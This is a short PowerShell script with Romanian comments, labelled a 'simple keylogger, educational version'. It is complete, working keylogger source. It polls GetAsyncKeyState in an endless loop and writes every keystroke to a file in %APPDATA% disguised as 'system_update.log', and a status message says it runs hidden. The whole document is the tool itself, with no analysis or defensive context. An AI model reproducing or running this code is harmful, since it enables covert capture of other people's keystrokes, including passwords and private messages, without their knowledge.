
# ================================================
# KEYLOGGER SIMPLU - Varianta Educationala
# Salveaza local in %APPDATA%\system_update.log
# ================================================

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class KB {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
}
"@ -PassThru

$logPath = "$env:APPDATA\system_update.log"

Write-Host "[+] Keylogger pornit - ruleaza ascuns" -ForegroundColor Green

while ($true) {
    Start-Sleep -Milliseconds 30
    
    for ($i = 8; $i -le 190; $i++) {
        if ([KB]::GetAsyncKeyState($i) -eq -32767) {
            $char = [char]$i
            
            if ($char -match "[a-zA-Z0-9\s\.\,\?\!\@\#\$\%\^\&\*\(\)\-\+\=]") {
                Add-Content -Path $logPath -Value $char -NoNewline
            } else {
                Add-Content -Path $logPath -Value " [$i] " -NoNewline
            }
        }
    }
}
